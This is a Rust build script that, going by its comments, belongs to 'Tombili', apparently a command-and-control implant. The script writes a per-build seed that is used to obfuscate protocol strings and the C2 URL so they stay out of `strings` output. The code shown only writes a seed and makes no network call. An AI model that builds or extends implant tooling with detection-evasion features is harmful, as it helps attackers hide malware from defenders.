use std::time::{SystemTime, UNIX_EPOCH};

fn main() {
    println!("cargo:rerun-if-changed=build.rs");

    // Tombili derives its obfuscation seed from hash(CompileTime & CompileDate).
    // Rust's const evaluation cannot read the clock, so the build script emits
    // the equivalent per-build seed into OUT_DIR and src/obf.rs includes it.
    //
    // This is string obfuscation, not encryption: it keeps protocol strings and
    // the C2 URL out of `strings` output on the compiled binary. The key and URL
    // are still recoverable by anything that runs the binary.
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u32)
        .unwrap_or(0x9E37_79B9)
        | 1;

    let out = std::path::PathBuf::from(std::env::var("OUT_DIR").expect("OUT_DIR"));
    std::fs::write(
        out.join("seed.rs"),
        format!("pub const SEED: u32 = {seed:#010x};\n"),
    )
    .expect("write seed");
}
